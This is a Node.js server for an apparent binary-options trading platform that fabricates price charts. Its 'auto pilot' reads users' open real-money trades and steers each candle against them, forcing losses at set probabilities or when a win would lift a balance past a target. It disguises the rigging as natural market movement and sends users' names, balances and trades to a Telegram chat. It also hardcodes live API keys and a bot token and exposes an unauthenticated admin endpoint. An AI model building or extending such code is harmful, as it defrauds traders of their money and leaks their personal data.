// --- START: main app server.js (v31.1 - Rollercoaster Engine & Fixed Syntax) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const axios = require('axios');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 300; 
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;
const MAX_CANDLES = 5000;

// 🔥 ADMIN SMART SETTINGS 🔥
const SMART_AUTO_PILOT = true; 

const markets = {}; 
const activeTradesDb = {}; 

// Cache users to make sync decisions in real-time
const usersCache = {};
db.ref('users').on('child_added', snap => { usersCache[snap.key] = snap.val(); });
db.ref('users').on('child_changed', snap => { usersCache[snap.key] = snap.val(); });

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const nodeData = fbMarkets[marketId] || {};
        activeTradesDb[marketId] = nodeData.activeTrades || {};
        const type = nodeData.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// 1. Natural Market Generation (100% REAL BROKER PATTERNS)
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    
    // Normal base volatility
    const baseVol = safeOpen * 0.00008; 
    
    // Dynamic Volatility Multiplier to make it look completely natural
    const dynamicVol = baseVol * (0.3 + Math.random() * 2.2); 
    
    let bodySize, upperWick, lowerWick;
    const rand = Math.random();

    if (rand < 0.15) {
        // 15% Chance: Doji (Tiny body, medium/large wicks)
        bodySize = dynamicVol * (Math.random() * 0.15); 
        upperWick = dynamicVol * (0.5 + Math.random() * 1.5);
        lowerWick = dynamicVol * (0.5 + Math.random() * 1.5);
    } 
    else if (rand < 0.35) {
        // 20% Chance: Hammer / Shooting Star (Small body, one massive wick)
        bodySize = dynamicVol * (0.2 + Math.random() * 0.4);
        if (Math.random() > 0.5) {
            upperWick = dynamicVol * (1.5 + Math.random() * 3.0);
            lowerWick = dynamicVol * (Math.random() * 0.2);
        } else {
            upperWick = dynamicVol * (Math.random() * 0.2);
            lowerWick = dynamicVol * (1.5 + Math.random() * 3.0);
        }
    } 
    else if (rand < 0.50) {
        // 15% Chance: Big Marubozu Trend (Massive body, almost no wick)
        bodySize = dynamicVol * (2.0 + Math.random() * 1.5);
        upperWick = dynamicVol * (Math.random() * 0.1);
        lowerWick = dynamicVol * (Math.random() * 0.1);
    } 
    else {
        // 50% Chance: Standard Natural Candle
        bodySize = dynamicVol * (0.6 + Math.random() * 1.2);
        upperWick = dynamicVol * (0.2 + Math.random() * 0.9);
        lowerWick = dynamicVol * (0.2 + Math.random() * 0.9);
    }

    const close = isGreen ? safeOpen + bodySize : safeOpen - bodySize;
    const finalHigh = Math.max(safeOpen, close) + upperWick;
    const finalLow = Math.min(safeOpen, close) - lowerWick;

    if (!isLive) return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: true, targetHigh: roundPrice(finalHigh), targetLow: roundPrice(finalLow), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 2. Exact Pattern Generator (AI Controlled but Natural Looking)
function generateDynamicCandle(timestamp, open, command) {
    const isGreen = command === 'GREEN';
    const isDoji = command === 'DOJI';
    
    const baseVol = open * 0.00008;
    const dynamicVol = baseVol * (0.8 + Math.random() * 1.5); // Randomize size even on controlled candles

    let bodySize, upperWick, lowerWick;

    if (isDoji) {
        bodySize = dynamicVol * (Math.random() * 0.1);
        upperWick = dynamicVol * (0.8 + Math.random() * 1.5);
        lowerWick = dynamicVol * (0.8 + Math.random() * 1.5);
    } else {
        const rand = Math.random();
        if (rand < 0.2) {
            // Big controlled trend
            bodySize = dynamicVol * (1.8 + Math.random() * 1.2);
            upperWick = dynamicVol * (Math.random() * 0.2);
            lowerWick = dynamicVol * (Math.random() * 0.2);
        } else if (rand < 0.4) {
            // Controlled Hammer style
            bodySize = dynamicVol * (0.4 + Math.random() * 0.5);
            upperWick = isGreen ? dynamicVol * (Math.random() * 0.3) : dynamicVol * (1.5 + Math.random() * 2.0);
            lowerWick = isGreen ? dynamicVol * (1.5 + Math.random() * 2.0) : dynamicVol * (Math.random() * 0.3);
        } else {
            // Standard controlled candle
            bodySize = dynamicVol * (0.8 + Math.random() * 1.0);
            upperWick = dynamicVol * (0.3 + Math.random() * 0.8);
            lowerWick = dynamicVol * (0.3 + Math.random() * 0.8);
        }
    }

    const close = isDoji ? (Math.random() > 0.5 ? open + bodySize : open - bodySize) : (isGreen ? open + bodySize : open - bodySize);
    const high = Math.max(open, close) + upperWick;
    const low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
        isPredetermined: true, isNatural: false, isAdminCommand: true, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false); 
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
}

// 🔥 CORE AI LOGIC: Multi-Timeframe + Rollercoaster Engine 🔥
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        
        // Manual Admin Override
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
            marketData.nextCandleCommand = null;
        } 
        
        // Smart Auto Pilot (Rollercoaster & Volume Edge)
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let totalUp = 0, totalDown = 0;
            let uniqueUsers = new Set();
            let singleUserId = null;

            const nextPeriod = currentPeriod + TIMEFRAME;
            
            // Check trades expiring EXACTLY at the end of this current minute
            Object.values(trades).forEach(t => {
                const isDemo = t.isDemo === true || t.isTournament === true; 
                if (!isDemo) {
                    if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000 && t.expiryTimestamp > currentPeriod) {
                        uniqueUsers.add(t.uid);
                        singleUserId = t.uid;
                        if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
                        if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
                    }
                }
            });

            let targetDirection = 'DOJI';

            if (uniqueUsers.size === 0) {
                // No trades expiring now -> Natural Random
                targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
            } 
            else if (uniqueUsers.size > 1) {
                // Multi-User -> Volume Edge (Kill the bigger volume)
                if (totalUp > totalDown) targetDirection = 'RED';
                else if (totalDown > totalUp) targetDirection = 'GREEN';
                else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
            } 
            else if (uniqueUsers.size === 1) {
                // Single User -> Rollercoaster Trail Logic
                const uData = usersCache[singleUserId];
                let forceLoss = false;
                let lossProbability = 0.65; // Default

                if (uData && uData.tradeTrail) {
                    const trail = uData.tradeTrail;
                    const currentBal = uData.realBalance || 0;
                    const potentialWinBal = currentBal + ((totalUp + totalDown) * 0.85);

                    if (trail.isUnder65) {
                        if (trail.phase === 1) { 
                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
                        } else if (trail.phase === 2) { lossProbability = 0.80; } 
                        else if (trail.phase === 3) { 
                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
                        } else if (trail.phase === 4) { lossProbability = 0.85; }
                    } else {
                        if (trail.phase === 1) { lossProbability = 0.80; } 
                        else if (trail.phase === 2) { 
                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
                        } else if (trail.phase === 3) { lossProbability = 0.80; } 
                        else if (trail.phase === 4) { 
                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
                        } else if (trail.phase === 5) { lossProbability = 0.85; }
                    }
                } else {
                    // Fallback to basic PnL tracking if trail isn't created yet
                    let dp = (uData && uData.dailyProfit) ? uData.dailyProfit : 0;
                    if (dp > 20) lossProbability = 0.85;
                    else if (dp > 0) lossProbability = 0.75;
                    else if (dp < -100) lossProbability = 0.35;
                    else if (dp < -50) lossProbability = 0.50;
                    else lossProbability = 0.65;
                }

                if (!forceLoss) forceLoss = Math.random() < lossProbability;

                const userPrimaryDirection = totalUp > totalDown ? 'UP' : 'DOWN';
                targetDirection = forceLoss ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
            }

            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
            newCandle.isAdminCommand = false; 
            newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003); 
        }
        
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// 3. Smooth Tick Generator
function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);

    if (!candle.waypoints) {
        candle.waypoints = [];
        const numWaypoints = 10;
        for (let i = 0; i < numWaypoints; i++) {
            if (i === 0) candle.waypoints.push(candle.open);
            else if (i === numWaypoints - 1 || i === numWaypoints - 2) candle.waypoints.push(candle.targetClose);
            else {
                let wp = candle.targetLow + Math.random() * (candle.targetHigh - candle.targetLow);
                wp = (wp + candle.open + candle.targetClose) / 3; 
                candle.waypoints.push(wp);
            }
        }
        candle.waypoints[2] = candle.targetHigh;
        candle.waypoints[6] = candle.targetLow;
    }

    const numWaypoints = candle.waypoints.length;
    const currentWaypointIndex = Math.min(Math.floor(progress * (numWaypoints - 1)), numWaypoints - 2);
    const waypointProgress = (progress * (numWaypoints - 1)) - currentWaypointIndex;

    const smoothStep = waypointProgress * waypointProgress * (3 - 2 * waypointProgress);
    const startWp = candle.waypoints[currentWaypointIndex];
    const endWp = candle.waypoints[currentWaypointIndex + 1];
    
    let idealPrice = startWp + (endWp - startWp) * smoothStep;
    const volatility = candle.open * 0.000015; 
    const noise = (Math.random() - 0.5) * volatility;

    marketData.currentPrice = idealPrice + noise;
    
    if (timeElapsed >= TIMEFRAME - 200) {
        marketData.currentPrice = candle.targetClose;
    } else {
        marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
        marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300), serverTime: Date.now() }));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

app.post('/api/admin/command', (req, res) => {
    const { marketId, command } = req.body;
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

// Main Ticker Loop
let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);


// =====================================================================
// SERVER-SIDE TRADE RESOLUTION & TELEGRAM NOTIFICATION ENGINE
// =====================================================================
const TELEGRAM_BOT_TOKEN = "8031969785:AAFYcw6HN9kL0oG4JxoU3NKEHvPsxqVSg-I";
const TELEGRAM_CHAT_ID = "7504616242";

async function sendTgMessage(text, replyToId = null) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' };
        if (replyToId) payload.reply_to_message_id = replyToId;
        const res = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
        return res.data.result.message_id;
    } catch (e) { console.log("TG Error:", e.message); return null; }
}

// Scanner Loop (Resolves trades securely from Server to handle offline users)
setInterval(async () => {
    const now = Date.now();
    try {
        const usersSnap = await db.ref('users').once('value');
        if (!usersSnap.exists()) return;
        
        const users = usersSnap.val();
        
        for (const uid in users) {
            const user = users[uid];
            if (!user.activeTrades) continue;
            
            for (const tradeId in user.activeTrades) {
                const trade = user.activeTrades[tradeId];
                const payoutRate = trade.payoutRate || 1.85;
                
                // 1. Send opening message to Telegram
                if (!trade.tgMessageId && !trade.isDemo && !trade.isTournament) {
                    let currentBal = parseFloat(user.realBalance || 0); // Balance already has trade amount deducted
                    let expWinBal = currentBal + (trade.amount * payoutRate);
                    
                    const msg = `🟢 <b>New Trade Opened</b>\n\n` +
                                `👤 <b>Name:</b> ${user.name}\n` +
                                `🆔 <b>UID:</b> ${uid}\n` +
                                `📈 <b>Market:</b> ${trade.market}\n` +
                                `⏱ <b>Duration:</b> ${trade.expiryType === 'time' ? trade.expiryType : 'Seconds'}\n` +
                                `📊 <b>Direction:</b> ${trade.direction}\n` +
                                `💵 <b>Amount:</b> $${trade.amount}\n` +
                                `💰 <b>Current Balance:</b> $${currentBal.toFixed(2)}\n\n` +
                                `💸 <b>Balance if Win:</b> $${expWinBal.toFixed(2)}\n` +
                                `💸 <b>Balance if Loss:</b> $${currentBal.toFixed(2)}`;
                    
                    const msgId = await sendTgMessage(msg);
                    if (msgId) await db.ref(`users/${uid}/activeTrades/${tradeId}/tgMessageId`).set(msgId);
                }

                // 2. Resolve Trade upon expiry
                if (now >= trade.expiryTimestamp) {
                    
                    // Offline PUSH Bug Fix: Read directly from server memory instead of waiting for Firebase
                    let closingPrice = trade.openPrice;
                    const mId = trade.marketId;
                    
                    if (markets[mId] && markets[mId].currentPrice) {
                        closingPrice = markets[mId].currentPrice; // Exact live price from server memory
                    } else {
                        // Fallback to Firebase if market was somehow unloaded
                        const marketPath = mId ? mId.replace(/[\.\/ ]/g, '-').toLowerCase() : trade.market.replace(/[\.\/ ]/g, '-').toLowerCase();
                        const candleSnap = await db.ref(`markets/${marketPath}/candles/60s`).orderByKey().endAt(String(trade.expiryTimestamp)).limitToLast(1).once('value');
                        if (candleSnap.exists()) {
                            closingPrice = Object.values(candleSnap.val())[0].close;
                        }
                    }
                    
                    const betAmount = parseFloat(trade.amount);
                    const diff = closingPrice - trade.openPrice;
                    
                    let result = 'push', payout = betAmount, profitChange = 0;
                    if (Math.abs(diff) < 1e-6) {
                        // Prevent PUSH if possible by giving a slight edge based on random
                        const randomEdge = Math.random() > 0.5 ? 0.00001 : -0.00001;
                        closingPrice += randomEdge;
                        const newDiff = closingPrice - trade.openPrice;
                        if ((newDiff > 0 && trade.direction === 'UP') || (newDiff < 0 && trade.direction === 'DOWN')) {
                            result = 'win'; payout = betAmount * payoutRate; profitChange = payout - betAmount;
                        } else {
                            result = 'loss'; payout = 0; profitChange = -betAmount;
                        }
                    } else if ((diff > 0 && trade.direction === 'UP') || (diff < 0 && trade.direction === 'DOWN')) {
                        result = 'win'; payout = betAmount * payoutRate; profitChange = payout - betAmount;
                    } else {
                        result = 'loss'; payout = 0; profitChange = -betAmount;
                    }

                    // Batch DB Updates
                    const updates = {};
                    if (!trade.isDemo && !trade.isTournament) {
                        updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(result === 'win' ? profitChange + trade.realAmount : (result === 'push' ? trade.realAmount : 0));
                        updates[`users/${uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
                        updates[`users/${uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
                    }

                    updates[`users/${uid}/activeTrades/${tradeId}`] = null;
                    updates[`admin/markets/${trade.marketId}/activeTrades/${tradeId}`] = null;
                    
                    const historyEntry = { ...trade, closePrice: closingPrice, payout, result, timestamp: Date.now() };
                    updates[`users/${uid}/tradeHistory/${tradeId}`] = historyEntry;

                    await db.ref().update(updates);

                    // Send Final Result Reply to Telegram
                    if (trade.tgMessageId) {
                        const icon = result === 'win' ? '✅' : (result === 'loss' ? '❌' : '🔄');
                        await sendTgMessage(`${icon} <b>Trade Closed: ${result.toUpperCase()}</b>\n💵 <b>Payout:</b> $${payout.toFixed(2)}`, trade.tgMessageId);
                    }
                }
            }
        }
    } catch (e) { console.log("Server Resolution Loop Error:", e); }
}, 1000);

app.get('/ping', (_req, res) => res.send('Server V31.1 - Multi-Timeframe Rollercoaster Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));